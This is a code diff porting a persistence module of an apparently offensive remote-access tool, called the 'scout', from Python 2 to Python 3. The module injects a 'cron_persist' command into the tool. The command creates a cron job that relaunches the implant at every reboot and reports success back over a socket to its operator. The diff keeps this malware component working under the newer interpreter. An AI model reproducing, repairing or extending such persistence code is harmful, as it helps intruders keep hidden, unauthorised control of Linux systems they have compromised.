@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -19,15 +18,15 @@ def cron_persist():
         job = cron.new(command=path.join(getcwd(),path.abspath(argv[0])))
     job.every_reboot() 
     cron.write()
-    s.sendall('[+]Acheived persistence via cron job!')
+    s.sendall('[+]Acheived persistence via cron job!'.encode())
 ''')
         config.logics.append('''
             elif command == "cron_persist":
                 cron_persist()''')
         config.help_menu['cron_persist'] = 'Create a cron job of the scout so it runs at startup'
     elif option == 'info':
-        print '\nName             : Cron job persistence component' \
+        print('\nName             : Cron job persistence component' \
               '\nOS               : Linux' \
               '\nRequired Modules : python-crontab (External), getpass, os, sys' \
               '\nCommands         : cron_persist' \
-              '\nDescription      : Create a cron job of the scout so it runs at startup\n'
+              '\nDescription      : Create a cron job of the scout so it runs at startup\n')
